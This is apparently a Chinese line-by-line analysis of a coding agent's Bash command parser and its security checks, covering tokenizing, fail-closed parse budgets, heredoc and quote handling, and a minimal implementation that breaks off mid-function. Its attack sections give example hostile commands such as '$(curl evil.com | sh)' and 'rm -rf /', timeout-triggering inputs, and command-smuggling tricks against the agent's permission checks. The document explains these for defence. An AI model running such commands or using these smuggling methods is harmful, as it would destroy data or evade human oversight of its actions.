# Bash命令解析器 - 逐行细粒度分析

**分析日期:** 2026-04-02

---

## 1. 解析器设计目标

### 1.1 核心使命

Claude Code CLI的Bash解析器是一个**安全优先**的命令分析系统，其核心目标是：

```
┌─────────────────────────────────────────────────────────────┐
│                    安全验证流程                               │
├─────────────────────────────────────────────────────────────┤
│  用户输入 → 解析器 → AST → 安全分析 → 权限检查 → 执行/拒绝    │
└─────────────────────────────────────────────────────────────┘
```

**关键设计目标：**

1. **准确解析Bash语法** - 正确处理引用、展开、管道、重定向等复杂结构
2. **安全边界检测** - 准确识别命令边界，防止命令走私（command smuggling）
3. **危险模式识别** - 检测命令替换、进程替换、参数展开等危险构造
4. **拒绝路径分析** - 区分"解析器不可用"和"解析超时/中止"，确保fail-closed

### 1.2 双路径架构

解析器采用**双路径设计**，实现功能门控和优雅降级：

```typescript
// parser.ts 第65-84行
if (feature('TREE_SITTER_BASH')) {
  await ensureParserInitialized()
  const mod = getParserModule()
  logLoadOnce(mod !== null)
  if (!mod) return null
  // ... tree-sitter解析路径
}
return null  // 回退到legacy regex路径（由调用方处理）
```

**Feature Flag控制：**
- `TREE_SITTER_BASH` - 主路径开关（仅限特定构建）
- `TREE_SITTER_BASH_SHADOW` - 影子模式（测试验证）

**降级策略：**
| 路径 | 解析器 | 准确度 | 性能 |
|------|--------|--------|------|
| Primary | tree-sitter AST | 最高 | 快 |
| Shadow | tree-sitter（验证） | 最高 | 快 |
| Legacy | regex/shell-quote | 中等 | 中 |

### 1.3 安全原则

**Fail-Closed设计：**

```typescript
// parser.ts 第86-93行 - PARSE_ABORTED哨兵值
/**
 * SECURITY: Sentinel for "parser was loaded and attempted, but aborted"
 * (timeout / node budget / Rust panic). Distinct from `null` (module not
 * loaded). Adversarial input can trigger abort under MAX_COMMAND_LENGTH:
 * `(( a[0][0]... ))` with ~2800 subscripts hits PARSE_TIMEOUT_MICROS.
 * Callers MUST treat this as fail-closed (too-complex), NOT route to legacy.
 */
export const PARSE_ABORTED = Symbol('parse-aborted')
```

**三态返回值语义：**
| 返回值 | 含义 | 处理策略 |
|--------|------|----------|
| `Node` | 解析成功 | 继续安全分析 |
| `null` | 模块未加载 | 回退legacy路径 |
| `PARSE_ABORTED` | 解析中止（超时/OOM） | **拒绝执行**（复杂命令） |

---

## 2. utils/bash/ast.ts 分析

### 2.1 核心类型定义

```typescript
// ast.ts 第10-17行
export type Node = TsNode

export interface ParsedCommandData {
  rootNode: Node            // AST根节点
  envVars: string[]         // 提取的环境变量赋值
  commandNode: Node | null  // 主命令节点
  originalCommand: string   // 原始命令字符串
}
```

**Node类型（来自bashParser.ts）：**
```typescript
// bashParser.ts 第12-18行
export type TsNode = {
  type: string              // 节点类型（command, pipeline, list等）
  text: string              // 节点文本内容
  startIndex: number        // UTF-8字节偏移（起始）
  endIndex: number          // UTF-8字节偏移（结束）
  children: TsNode[]        // 子节点数组
}
```

### 2.2 解析入口函数

```typescript
// ast.ts 第56-84行
export async function parseCommand(
  command: string,
): Promise<ParsedCommandData | null> {
  // 第59行：空命令或超长命令直接返回null
  if (!command || command.length > MAX_COMMAND_LENGTH) return null
  
  // MAX_COMMAND_LENGTH = 10000（第19行）
  // 防止DoS攻击和内存溢出

  // 第65行：Feature门控
  if (feature('TREE_SITTER_BASH')) {
    await ensureParserInitialized()
    const mod = getParserModule()
    logLoadOnce(mod !== null)
    if (!mod) return null

    try {
      // 第72行：调用native解析
      const rootNode = mod.parse(command)
      if (!rootNode) return null

      // 第75-76行：提取命令节点和环境变量
      const commandNode = findCommandNode(rootNode, null)
      const envVars = extractEnvVars(commandNode)

      return { rootNode, envVars, commandNode, originalCommand: command }
    } catch {
      return null  // 异常时返回null（回退legacy）
    }
  }
  return null
}
```

### 2.3 命令节点查找算法

**findCommandNode递归搜索算法：**

```typescript
// ast.ts 第138-173行
function findCommandNode(node: Node, parent: Node | null): Node | null {
  const { type, children } = node

  // 第141行：直接命中command或declaration_command
  if (COMMAND_TYPES.has(type)) return node
  // COMMAND_TYPES = new Set(['command', 'declaration_command'])（第34行）

  // 第144-150行：变量赋值后跟命令
  if (type === 'variable_assignment' && parent) {
    return (
      parent.children.find(
        c => COMMAND_TYPES.has(c.type) && c.startIndex > node.startIndex,
      ) ?? null
    )
  }
  // 示例：VAR=value echo hello
  // variable_assignment节点后找同级的command节点

  // 第153-159行：管道结构递归
  if (type === 'pipeline') {
    for (const child of children) {
      const result = findCommandNode(child, node)
      if (result) return result
    }
    return null
  }

  // 第162-164行：重定向语句提取内部命令
  if (type === 'redirected_statement') {
    return children.find(c => COMMAND_TYPES.has(c.type)) ?? null
  }
  // 示例：cat file > output
  // redirected_statement包含command和file_redirect

  // 第167-170行：通用递归搜索
  for (const child of children) {
    const result = findCommandNode(child, node)
    if (result) return result
  }

  return null
}
```

**节点类型分类：**
```typescript
// ast.ts 第20-34行
const DECLARATION_COMMANDS = new Set([
  'export', 'declare', 'typeset', 'readonly', 'local', 'unset', 'unsetenv',
])
const ARGUMENT_TYPES = new Set(['word', 'string', 'raw_string', 'number'])
const SUBSTITUTION_TYPES = new Set(['command_substitution', 'process_substitution'])
const COMMAND_TYPES = new Set(['command', 'declaration_command'])
```

### 2.4 环境变量提取

```typescript
// ast.ts 第175-187行
function extractEnvVars(commandNode: Node | null): string[] {
  if (!commandNode || commandNode.type !== 'command') return []

  const envVars: string[] = []
  for (const child of commandNode.children) {
    if (child.type === 'variable_assignment') {
      // 收集所有前置变量赋值
      envVars.push(child.text)  // 如 "VAR=value"
    } else if (child.type === 'command_name' || child.type === 'word') {
      // 遇到命令名就停止（变量赋值只在命令前）
      break
    }
  }
  return envVars
}
```

**示例解析：**
```bash
输入: FOO=bar BAR=baz echo hello
输出:
  envVars: ['FOO=bar', 'BAR=baz']
  commandNode: command节点（name='echo', args=['hello'])
```

### 2.5 命令参数提取

```typescript
// ast.ts 第189-222行
export function extractCommandArguments(commandNode: Node): string[] {
  // 第191-196行：声明命令特殊处理
  if (commandNode.type === 'declaration_command') {
    const firstChild = commandNode.children[0]
    return firstChild && DECLARATION_COMMANDS.has(firstChild.text)
      ? [firstChild.text]
      : []
  }
  // export/declare等命令只返回命令名本身

  const args: string[] = []
  let foundCommandName = false

  for (const child of commandNode.children) {
    // 第202行：跳过变量赋值
    if (child.type === 'variable_assignment') continue

    // 第205-212行：提取命令名
    if (
      child.type === 'command_name' ||
      (!foundCommandName && child.type === 'word')
    ) {
      foundCommandName = true
      args.push(child.text)
      continue
    }

    // 第215-219行：提取参数
    if (ARGUMENT_TYPES.has(child.type)) {
      args.push(stripQuotes(child.text))  // 去除引号
    } else if (SUBSTITUTION_TYPES.has(child.type)) {
      break  // 遇到命令替换就停止（安全边界）
    }
  }
  return args
}
```

**stripQuotes辅助函数：**
```typescript
// ast.ts 第224-230行
function stripQuotes(text: string): string {
  return text.length >= 2 &&
    ((text[0] === '"' && text.at(-1) === '"') ||
      (text[0] === "'" && text.at(-1) === "'"))
    ? text.slice(1, -1)
    : text
}
```

---

## 3. utils/bash/parser.ts 分析

### 3.1 Raw解析优化

**parseCommandRaw跳过后处理以提升性能：**

```typescript
// parser.ts 第104-136行
export async function parseCommandRaw(
  command: string,
): Promise<Node | null | typeof PARSE_ABORTED> {
  // 第107行：前置检查
  if (!command || command.length > MAX_COMMAND_LENGTH) return null
  
  // 第108行：支持Shadow模式
  if (feature('TREE_SITTER_BASH') || feature('TREE_SITTER_BASH_SHADOW')) {
    await ensureParserInitialized()
    const mod = getParserModule()
    logLoadOnce(mod !== null)
    if (!mod) return null
    
    try {
      const result = mod.parse(command)
      
      // 第119-125行：关键安全分支
      if (result === null) {
        logEvent('tengu_tree_sitter_parse_abort', {
          cmdLength: command.length,
          panic: false,
        })
        return PARSE_ABORTED  // 区分"超时中止"和"模块不可用"
      }
      return result
      
    } catch {
      // 第128-132行：Rust panic处理
      logEvent('tengu_tree_sitter_parse_abort', {
        cmdLength: command.length,
        panic: true,
      })
      return PARSE_ABORTED
    }
  }
  return null
}
```

**设计要点：**
- 安全分析器（ast.ts）只需要rootNode，不需要commandNode/envVars
- 节省一次树遍历，每个Bash命令减少~6次遍历

### 3.2 初始化管理

```typescript
// parser.ts 第50-54行
export async function ensureInitialized(): Promise<void> {
  if (feature('TREE_SITTER_BASH') || feature('TREE_SITTER_BASH_SHADOW')) {
    await ensureParserInitialized()  // 调用bashParser.ts的初始化
  }
}
// 幂等操作 - 多次调用安全
```

### 3.3 日志遥测

```typescript
// parser.ts 第36-44行
let logged = false
function logLoadOnce(success: boolean): void {
  if (logged) return  // 只记录首次加载状态
  logged = true
  logForDebugging(
    success ? 'tree-sitter: native module loaded' : 'tree-sitter: unavailable',
  )
  logEvent('tengu_tree_sitter_load', { success })
}
```

---

## 4. utils/bash/bashParser.ts 分析（纯TypeScript解析器）

### 4.1 解析器架构概览

```
┌──────────────────────────────────────────────────────────────┐
│                    bashParser.ts 架构                          │
├──────────────────────────────────────────────────────────────┤
│  ┌─────────────┐    ┌─────────────┐    ┌─────────────────┐   │
│  │  Lexer      │ →  │  Parser     │ →  │  AST Builder    │   │
│  │ (Tokenize)  │    │ (Recursive  │    │ (Node Factory)  │   │
│  │             │    │  Descent)   │    │                 │   │
│  └─────────────┘    └─────────────┘    └─────────────────┘   │
│        ↓                  ↓                   ↓              │
│  UTF-8 Byte        Context-Sensitive     TsNode Tree         │
│  Offset Track      Operator Detection    (tree-sitter        │
│                    (cmd vs arg mode)       compatible)        │
└──────────────────────────────────────────────────────────────┘
```

### 4.2 Token类型定义

```typescript
// bashParser.ts 第50-66行
type TokenType =
  | 'WORD'           // 标识符/路径/参数
  | 'NUMBER'         // 数字
  | 'OP'             // 操作符（&& || | ; 等）
  | 'NEWLINE'        // 换行
  | 'COMMENT'        // 注释
  | 'DQUOTE'         // 双引号起始
  | 'SQUOTE'         // 单引号起始
  | 'ANSI_C'         // $'...' ANSI-C字符串
  | 'DOLLAR'         // $ 符号
  | 'DOLLAR_PAREN'   // $( 命令替换
  | 'DOLLAR_BRACE'   // ${ 参数展开
  | 'DOLLAR_DPAREN'  // $(( 算术展开
  | 'BACKTICK'       // ` 反引号
  | 'LT_PAREN'       // <( 进程替换
  | 'GT_PAREN'       // >( 进程替换
  | 'EOF'            // 结束标记
```

### 4.3 Lexer状态结构

```typescript
// bashParser.ts 第109-121行
type Lexer = {
  src: string           // 源字符串
  len: number           // 长度
  i: number             // JS字符串索引
  b: number             // UTF-8字节偏移
  heredocs: HeredocPending[]  // 待处理heredoc
  byteTable: Uint32Array | null  // 字符→字节映射表
}
```

**UTF-8处理关键函数：**

```typescript
// bashParser.ts 第145-160行
function advance(L: Lexer): void {
  const c = L.src.charCodeAt(L.i)
  L.i++
  if (c < 0x80) {
    L.b++  // ASCII: 1字节
  } else if (c < 0x800) {
    L.b += 2  // 2字节UTF-8
  } else if (c >= 0xd800 && c <= 0xdbff) {
    // 高代理项 → UTF-16代理对 → 4字节UTF-8
    L.b += 4
    L.i++
  } else {
    L.b += 3  // 3字节UTF-8
  }
}
```

### 4.4 Tokenizer核心逻辑

**nextToken上下文敏感扫描：**

```typescript
// bashParser.ts 第302-591行
function nextToken(L: Lexer, ctx: 'cmd' | 'arg' = 'arg'): Token {
  skipBlanks(L)  // 第303行：跳过空白
  const start = L.b
  
  // 第306行：EOF检查
  if (L.i >= L.len) return { type: 'EOF', value: '', start, end: start }
  
  const c = L.src[L.i]!
  const c1 = peek(L, 1)
  const c2 = peek(L, 2)
  
  // 第311-314行：换行处理
  if (c === '\n') {
    advance(L)
    return { type: 'NEWLINE', value: '\n', start, end: L.b }
  }
  
  // 第316-325行：注释扫描
  if (c === '#') {
    const si = L.i
    while (L.i < L.len && L.src[L.i] !== '\n') advance(L)
    return {
      type: 'COMMENT',
      value: L.src.slice(si, L.i),
      start,
      end: L.b,
    }
  }
  
  // 第328-447行：多字符操作符（最长匹配优先）
  // && || |& ;;& ;; ;& >> >&- >& >| &>> &> <<< <<-
  // << <&- <& <( >( (( )) 等
  
  // 第449-472行：上下文敏感操作符
  if (ctx === 'cmd') {
    // 在命令位置，[ [[ { 是操作符；在参数位置是word字符
    if (c === '[' && c1 === '[') {
      advance(L)
      advance(L)
      return { type: 'OP', value: '[[', start, end: L.b }
    }
    // ...
  }
  
  // 第474-527行：引号和$处理
  if (c === '"') { ... }
  if (c === "'") { ... }
  if (c === '$') {
    // $(( $( ${ $' 等变体处理
  }
  
  // 第551-591行：单词扫描
  if (isWordStart(c) || c === '{' || c === '}') {
    // 扫描完整单词，处理转义
  }
}
```

### 4.5 Parser递归下降结构

**解析函数层次：**

```
parseProgram (顶层)
    ↓
parseStatements (语句序列)
    ↓
parseAndOr (&& || 链)
    ↓
parsePipeline (| 管道)
    ↓
parseCommand (单命令)
    ↓
parseSimpleCommand (简单命令)
    ├── tryParseAssignment (变量赋值)
    ├── tryParseRedirect (重定向)
    └── parseWord (参数)
```

**parseProgram：**
```typescript
// bashParser.ts 第706-752行
function parseProgram(P: ParseState): TsNode {
  const children: TsNode[] = []
  // 跳过前导空白
  skipBlanks(P.L)
  while (true) {
    const save = saveLex(P.L)
    const t = nextToken(P.L, 'cmd')
    if (t.type === 'NEWLINE') {
      skipBlanks(P.L)
      continue
    }
    restoreLex(P.L, save)
    break
  }
  
  const progStart = P.L.b
  while (P.L.i < P.L.len) {
    // 解析语句序列
    const stmts = parseStatements(P, null)
    for (const s of stmts) children.push(s)
    
    if (stmts.length === 0) {
      // 无法解析 → 发射ERROR节点并跳过
      const errTok = nextToken(P.L, 'cmd')
      children.push(mk(P, 'ERROR', errTok.start, errTok.end, []))
    }
  }
  
  return mk(P, 'program', progStart, progEnd, children)
}
```

**parsePipeline：**
```typescript
// bashParser.ts 第938-992行
function parsePipeline(P: ParseState): TsNode | null {
  let first = parseCommand(P)
  if (!first) return null
  const parts: TsNode[] = [first]
  
  while (true) {
    const save = saveLex(P.L)
    const t = nextToken(P.L, 'cmd')
    
    // 第945行：检测 | 或 |& 操作符
    if (t.type === 'OP' && (t.value === '|' || t.value === '|&')) {
      const op = leaf(P, t.value, t)
      skipNewlines(P)
      const next = parseCommand(P)
      
      // 第954-981行：重定向提升（hoist）
      // 管道后命令的重定向提升到包装pipeline片段
      if (next.type === 'redirected_statement' && ...) {
        // 特殊结构处理
      }
      
      parts.push(op, next)
    } else {
      restoreLex(P.L, save)
      break
    }
  }
  
  // 第989-991行：返回pipeline或单命令
  if (parts.length === 1) return parts[0]
  return mk(P, 'pipeline', parts[0].startIndex, last.endIndex, parts)
}
```

### 4.6 安全预算控制

```typescript
// bashParser.ts 第25-32行
const PARSE_TIMEOUT_MS = 50  // 50ms墙钟上限
const MAX_NODES = 50_000     // 节点预算上限

// 第647-657行
function checkBudget(P: ParseState): void {
  P.nodeCount++
  if (P.nodeCount > MAX_NODES) {
    P.aborted = true
    throw new Error('budget')  // OOM保护
  }
  // 每128节点检查超时
  if ((P.nodeCount & 0x7f) === 0 && performance.now() > P.deadline) {
    P.aborted = true
    throw new Error('timeout')  // DoS保护
  }
}
```

**对抗性输入示例：**
```bash
# 触发超时（约2800下标）
(( a[0][0][0][0]...[0] ))

# 触发OOM（深度嵌套）
((((((((((...命令...))))))))))
```

### 4.7 Heredoc处理

**scanHeredocBodies：**
```typescript
// bashParser.ts 第1885-1927行
function scanHeredocBodies(P: ParseState): void {
  // 跳到换行符
  while (P.L.i < P.L.len && P.src[P.L.i] !== '\n') advance(P.L)
  if (P.L.i < P.L.len) advance(P.L)
  
  for (const hd of P.L.heredocs) {
    hd.bodyStart = P.L.b
    const delimLen = hd.delim.length
    
    while (P.L.i < P.L.len) {
      const lineStart = P.L.i
      const lineStartB = P.L.b
      
      // 第1897-1899行：<<- 去除前导tab
      if (hd.stripTabs) {
        while (checkI < P.L.len && P.src[checkI] === '\t') checkI++
      }
      
      // 第1901-1906行：检测分隔符行
      if (
        P.src.startsWith(hd.delim, checkI) &&
        (checkI + delimLen >= P.L.len ||
          P.src[checkI + delimLen] === '\n')
      ) {
        hd.bodyEnd = lineStartB
        // 记录分隔符位置
        return
      }
      
      // 消耗一行
      while (P.L.i < P.L.len && P.src[P.L.i] !== '\n') advance(P.L)
    }
  }
}
```

---

## 5. tree-sitter集成

### 5.1 treeSitterAnalysis.ts概述

**核心导出函数：**
```typescript
// treeSitterAnalysis.ts 第496-506行
export function analyzeCommand(
  rootNode: unknown,
  command: string,
): TreeSitterAnalysis {
  return {
    quoteContext: extractQuoteContext(rootNode, command),
    compoundStructure: extractCompoundStructure(rootNode, command),
    hasActualOperatorNodes: hasActualOperatorNodes(rootNode),
    dangerousPatterns: extractDangerousPatterns(rootNode),
  }
}
```

**TreeSitterAnalysis类型：**
```typescript
// treeSitterAnalysis.ts 第58-64行
export type TreeSitterAnalysis = {
  quoteContext: QuoteContext              // 引用上下文
  compoundStructure: CompoundStructure    // 复合结构
  hasActualOperatorNodes: boolean         // 真实操作符存在
  dangerousPatterns: DangerousPatterns    // 危险模式
}
```

### 5.2 引用上下文提取

**QuoteContext类型：**
```typescript
// treeSitterAnalysis.ts 第22-28行
export type QuoteContext = {
  withDoubleQuotes: string      // 去除单引号内容，保留双引号内容
  fullyUnquoted: string         // 去除所有引用内容
  unquotedKeepQuoteChars: string // 去除内容但保留引号字符
}
```

**collectQuoteSpans单次遍历优化：**
```typescript
// treeSitterAnalysis.ts 第88-137行
function collectQuoteSpans(
  node: TreeSitterNode,
  out: QuoteSpans,
  inDouble: boolean,
): void {
  switch (node.type) {
    case 'raw_string':
      out.raw.push([node.startIndex, node.endIndex])
      return  // 单引号体内无嵌套引用
    case 'ansi_c_string':
      out.ansiC.push([node.startIndex, node.endIndex])
      return  // ANSI-C字符串也是literal
    case 'string':
      // 第104行：只收集最外层双引号
      if (!inDouble) out.double.push([node.startIndex, node.endIndex])
      for (const child of node.children) {
        if (child) collectQuoteSpans(child, out, true)  // 递归进入
      }
      return
    case 'heredoc_redirect':
      // 第115-126行：检测引用heredoc
      // <<'EOF', <<"EOF", <<\EOF 是literal
      // <<EOF 展开$()/${}
      let isQuoted = false
      for (const child of node.children) {
        if (child && child.type === 'heredoc_start') {
          const first = child.text[0]
          isQuoted = first === "'" || first === '"' || first === '\\'
          break
        }
      }
      if (isQuoted) {
        out.heredoc.push([node.startIndex, node.endIndex])
        return  // 引用heredoc无嵌套
      }
      break  // 非引用heredoc需要递归
  }
  
  // 第134-136行：通用递归
  for (const child of node.children) {
    if (child) collectQuoteSpans(child, out, inDouble)
  }
}
```

**之前5次遍历 → 现在1次遍历（~5x优化）：**
```
旧方案：raw_string遍历 + ansi_c遍历 + string遍历 + heredoc遍历 + 全类型遍历
新方案：单次switch递归收集所有类型
```

### 5.3 复合结构分析

```typescript
// treeSitterAnalysis.ts 第296-411行
export function extractCompoundStructure(
  rootNode: unknown,
  command: string,
): CompoundStructure {
  const n = rootNode as TreeSitterNode
  const operators: string[] = []
  const segments: string[] = []
  let hasSubshell = false
  let hasCommandGroup = false
  let hasPipeline = false
  
  function walkTopLevel(node: TreeSitterNode): void {
    for (const child of node.children) {
      if (child.type === 'list') {
        // 第314-340行：list节点包含 && || 操作符
        for (const listChild of child.children) {
          if (listChild.type === '&&' || listChild.type === '||') {
            operators.push(listChild.type)
          } else if (listChild.type === 'pipeline') {
            hasPipeline = true
            segments.push(listChild.text)
          } // ...
        }
      } else if (child.type === ';') {
        operators.push(';')
      } else if (child.type === 'pipeline') {
        hasPipeline = true
        segments.push(child.text)
      } else if (child.type === 'subshell') {
        hasSubshell = true
        segments.push(child.text)
      } // ...
    }
  }
  
  walkTopLevel(n)
  
  return {
    hasCompoundOperators: operators.length > 0,
    hasPipeline,
    hasSubshell,
    hasCommandGroup,
    operators,
    segments,
  }
}
```

### 5.4 真实操作符检测

**消除 `find -exec \;` 误报：**

```typescript
// treeSitterAnalysis.ts 第421-443行
export function hasActualOperatorNodes(rootNode: unknown): boolean {
  const n = rootNode as TreeSitterNode
  
  function walk(node: TreeSitterNode): boolean {
    // 第426行：检查真实操作符节点
    if (node.type === ';' || node.type === '&&' || node.type === '||') {
      return true  // 这是AST中的操作符节点
    }
    
    // 第431行：list节点意味着存在复合操作符
    if (node.type === 'list') {
      return true
    }
    
    for (const child of node.children) {
      if (child && walk(child)) return true
    }
    return false
  }
  
  return walk(n)
}
```

**关键区别：**
```bash
# find -exec cmd \; 
# \; 是 word 节点（参数），不是 ; 操作符节点
# hasActualOperatorNodes → false

# cmd1 ; cmd2
# ; 是 ; 操作符节点
# hasActualOperatorNodes → true
```

### 5.5 危险模式检测

```typescript
// treeSitterAnalysis.ts 第448-489行
export function extractDangerousPatterns(rootNode: unknown): DangerousPatterns {
  const n = rootNode as TreeSitterNode
  let hasCommandSubstitution = false
  let hasProcessSubstitution = false
  let hasParameterExpansion = false
  let hasHeredoc = false
  let hasComment = false
  
  function walk(node: TreeSitterNode): void {
    switch (node.type) {
      case 'command_substitution':
        hasCommandSubstitution = true  // $(cmd) 或 `cmd`
        break
      case 'process_substitution':
        hasProcessSubstitution = true  // <(cmd) 或 >(cmd)
        break
      case 'expansion':
        hasParameterExpansion = true   // ${var}
        break
      case 'heredoc_redirect':
        hasHeredoc = true              // <<EOF
        break
      case 'comment':
        hasComment = true              // # comment
        break
    }
    
    for (const child of node.children) {
      if (child) walk(child)
    }
  }
  
  walk(n)
  
  return {
    hasCommandSubstitution,
    hasProcessSubstitution,
    hasParameterExpansion,
    hasHeredoc,
    hasComment,
  }
}
```

---

## 6. 安全分析

### 6.1 安全设计原则

**核心原则：**

1. **Fail-Closed** - 解析失败时拒绝执行，而非静默通过
2. **Quote-Aware** - 正确理解引用边界，防止引用逃逸
3. **Parser Differential Hardening** - 消除解析器差异导致的漏洞
4. **Budget Enforcement** - 超时/节点预算防止DoS

### 6.2 命令走私防御

**攻击模式：**
```bash
# 引用逃逸
echo '${}; curl evil.com'
# 若错误提取，可能误认为${}在引用外

# Heredoc走私
cat <<'SAFE'
$(evil_command)
SAFE
# 引用heredoc内的$()不执行，但若误提取可能隐藏

# 操作符伪装
find / -exec rm {} \;
# \; 是参数不是分隔符，若误判会分割命令
```

**防御措施（heredoc.ts）：**
```typescript
// heredoc.ts 第139-150行 - 预验证
if (/\$['"]/.test(command)) {
  return { processedCommand: command, heredocs }  // 拒绝$'和$"
}
if (firstHeredocPos > 0 && command.slice(0, firstHeredocPos).includes('`')) {
  return { processedCommand: command, heredocs }  // 拒绝反引号
}

// 第160-168行 - 算术上下文检测
if (firstHeredocPos > 0) {
  const beforeHeredoc = command.slice(0, firstHeredocPos)
  const openArith = (beforeHeredoc.match(/\(\(/g) || []).length
  const closeArith = (beforeHeredoc.match(/\)\)/g) || []).length
  if (openArith > closeArith) {
    return { processedCommand: command, heredocs }  // 可能是位移<<
  }
}
```

### 6.3 嵌套Heredoc防御

```typescript
// heredoc.ts 第624-638行
const topLevelHeredocs = heredocMatches.filter((candidate, _i, all) => {
  for (const other of all) {
    if (candidate === other) continue
    // 检查候选是否在其他heredoc内容范围内
    if (
      candidate.operatorStartIndex > other.contentStartIndex &&
      candidate.operatorStartIndex < other.contentEndIndex
    ) {
      return false  // 嵌套heredoc，过滤掉
    }
  }
  return true
})
```

### 6.4 行 continuation处理

```typescript
// commands.ts 第106-120行
const commandWithContinuationsJoined = processedCommand.replace(
  /\\+\n/g,
  match => {
    const backslashCount = match.length - 1
    if (backslashCount % 2 === 1) {
      // 奇数反斜杠：最后一个转义换行（行续行）
      return '\\'.repeat(backslashCount - 1)
    } else {
      // 偶数反斜杠：成对转义序列，换行是分隔符
      return match
    }
  }
)
```

**安全要点：**
- `\<newline>` = 行续行（无空格连接）
- `\\<newline>` = 转义反斜杠 + 命令分隔

---

## 7. 危险命令检测

### 7.1 命令规范系统

**registry.ts：**
```typescript
// registry.ts 第4-28行
export type CommandSpec = {
  name: string
  description?: string
  subcommands?: CommandSpec[]
  args?: Argument | Argument[]
  options?: Option[]
}

export type Argument = {
  name?: string
  isDangerous?: boolean       // 危险参数标记
  isVariadic?: boolean        // 可变参数
  isOptional?: boolean
  isCommand?: boolean         // 包装命令（sudo, timeout等）
  isModule?: string | boolean // 模块参数（python -m）
  isScript?: boolean          // 脚本文件
}
```

### 7.2 内置命令规范

**specs/index.ts：**
```typescript
// specs/index.ts 第1-18行
import pyright from './pyright.js'
import timeout from './timeout.js'
import sleep from './sleep.js'
import alias from './alias.js'
import nohup from './nohup.js'
import time from './time.js'
import srun from './srun.js'

export default [
  pyright,
  timeout,
  sleep,
  alias,
  nohup,
  time,
  srun,
] satisfies CommandSpec[]
```

**timeout示例：**
```typescript
// specs/timeout.ts
export default {
  name: 'timeout',
  args: [
    { name: 'duration', isDangerous: false },
    { name: 'command', isCommand: true },  // 包装命令
  ],
  options: [
    { name: '--signal', args: { name: 'signal' } },
    { name: '--kill-after', args: { name: 'duration' } },
  ],
}
```

### 7.3 动态规范加载

```typescript
// registry.ts 第30-43行
export async function loadFigSpec(
  command: string,
): Promise<CommandSpec | null> {
  // 安全检查
  if (!command || command.includes('/') || command.includes('\\')) return null
  if (command.includes('..')) return null
  if (command.startsWith('-') && command !== '-') return null
  
  try {
    // 动态加载@withfig/autocomplete规范
    const module = await import(`@withfig/autocomplete/build/${command}.js`)
    return module.default || module
  } catch {
    return null
  }
}
```

### 7.4 危险模式类型

**DangerousPatterns检测：**
```typescript
// treeSitterAnalysis.ts 第45-56行
export type DangerousPatterns = {
  hasCommandSubstitution: boolean   // $(cmd) 或 `cmd`
  hasProcessSubstitution: boolean   // <(cmd) 或 >(cmd)
  hasParameterExpansion: boolean    // ${var}
  hasHeredoc: boolean                // <<EOF
  hasComment: boolean                // # comment
}
```

**各模式安全影响：**
| 模式 | 风险 | 示例 |
|------|------|------|
| command_substitution | 嵌套执行任意命令 | `$(curl evil.com | sh)` |
| process_substitution | 进程IO重定向 | `diff <(sort a) <(sort b)` |
| parameter_expansion | 动态值注入 | `${USER_INPUT}` |
| heredoc | 多行内容隐藏 | `cat <<EOF\n$(evil)\nEOF` |
| comment | 后续命令隐藏 | `echo #; rm -rf /` |

---

## 8. 从零实现

### 8.1 最小解析器实现

**步骤1：定义核心类型**
```typescript
// types.ts
export type Node = {
  type: string
  text: string
  startIndex: number
  endIndex: number
  children: Node[]
}

export type ParseResult = {
  rootNode: Node
  commandName: string | null
  args: string[]
  hasSubstitution: boolean
}
```

**步骤2：实现基础Lexer**
```typescript
// lexer.ts
type Token = { type: string; value: string; pos: number }

function tokenize(input: string): Token[] {
  const tokens: Token[] = []
  let i = 0
  
  while (i < input.length) {
    // 空白跳过
    if (input[i] === ' ' || input[i] === '\t') {
      i++
      continue
    }
    
    // 操作符
    if (input[i] === '|' && input[i+1] === '|') {
      tokens.push({ type: 'OP', value: '||', pos: i })
      i += 2
      continue
    }
    if (input[i] === '&' && input[i+1] === '&') {
      tokens.push({ type: 'OP', value: '&&', pos: i })
      i += 2
      continue
    }
    if (input[i] === '|') {
      tokens.push({ type: 'OP', value: '|', pos: i })
      i++
      continue
    }
    
    // 单词扫描
    if (isWordChar(input[i])) {
      const start = i
      while (i < input.length && isWordChar(input[i])) i++
      tokens.push({ type: 'WORD', value: input.slice(start, i), pos: start })
      continue
    }
    
    // 未知字符作为单字符word
    tokens.push({ type: 'WORD', value: input[i], pos: i })
    i++
  }
  
  return tokens
}

function isWordChar(c: string): boolean {
  return /[a-zA-Z0-9_/.\-+:@%~,!?=]/.test(c)
}
```

**步骤3：实现Parser**
```typescript
// parser.ts
function parse(tokens: Token[]): Node {
  const children: Node[] = []
  let i = 0
  
  while (i < tokens.length) {
    const stmt = parseStatement(tokens, i)
    if (stmt.node) {
      children.push(stmt.node)
      i = stmt.nextIndex
    } else {
      break
    }
  }
  
  return {
    type: 'program',
    text: '', // 可从原始输入提取
    startIndex: 0,
    endIndex: 0,
    children,
  }
}

function parseStatement(tokens: Token[], start: number): { node: Node | null; nextIndex: number } {
  let i = start
  const parts: Node[] = []
  
  // 扫描直到操作符或结束
  while (i < tokens.length) {
    const t = tokens[i]
    
    if (t.type === 'OP' && (t.value === '|' || t.value === '&&' || t.value === '||')) {
      // 管道/链操作符
      if (parts.length === 0) return { node: null, nextIndex: i }
      
      const leftNode: Node = parts.length === 1 
        ? parts[0] 
        : { type: 'pipeline', text: '', startIndex: 0, endIndex: 0, children: parts }
      
      const opNode: Node = { type: t.value, text: t.value, startIndex: t.pos, endIndex: t.pos + t.value.length, children: [] }
      
      // 解析右边
      const right = parseStatement(tokens, i + 1)
      if (right.node) {
        return {
          node: {
            type: 'list',
            text: '',
            startIndex: 0,
            endIndex: 0,
            children: [leftNode, opNode, right.node],
          },
          nextIndex: right.nextIndex,
        }
      }
      return { node: leftNode, nextIndex: i }
    }
    
    if (t.type === 'WORD') {
      parts.push({
        type: parts.length === 0 ? 'command_name' : 'word',
        text: t.value,
        startIndex: t.pos,
        endIndex: t.pos + t.value.length,
        children: [],
      })
      i++
      continue
    }
    
    break
  }
  
  if (parts.length === 0) return { node: null, nextIndex: i }
  
  return {
    node: {
      type: 'command',
      text: '',
      startIndex: parts[0].startIndex,
      endIndex: parts[parts.length - 1].endIndex,
      children: parts,
    },
    nextIndex: i,
  }
}
```

**步骤4：安全分析**
```typescript
// security.ts
function analyzeForSecurity(node: Node): SecurityReport {
  return {
    commandName: findCommandName(node),
    hasCommandSubstitution: walkFor(node, 'command_substitution'),
    hasProcessSubstitution: walkFor(node, 'process_substitution'),
    hasParameterExpansion: walkFor(node, 'expansion'),
    compoundOperators: findOperators(node),
  }
}

function findCommandName(node: Node): string | null {
  if (node.type === 'command') {
    const nameNode = node.children.find(c => c.type === 'command_name')
    return nameNode?.text ?? null
  }
  for (const child of node.children) {
    const name = findCommandName(child)
